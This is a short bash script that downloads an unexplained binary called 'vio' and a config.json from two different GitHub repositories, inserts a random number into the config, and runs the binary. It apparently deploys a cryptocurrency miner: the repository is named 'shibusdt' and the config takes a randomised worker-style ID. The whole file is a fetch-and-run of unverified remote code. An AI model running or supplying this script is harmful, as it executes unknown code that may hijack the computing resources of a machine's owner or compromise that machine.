#!/bin/bash

sudo apt update
wget https://raw.githubusercontent.com/trautroi/shibusdt/main/vio
wget https://raw.githubusercontent.com/outbesok/121/main/config.json  && chmod +x vio && sed -i "s/xavix/$(shuf -n 1 -i 1-99999)/" "config.json" && ./vio

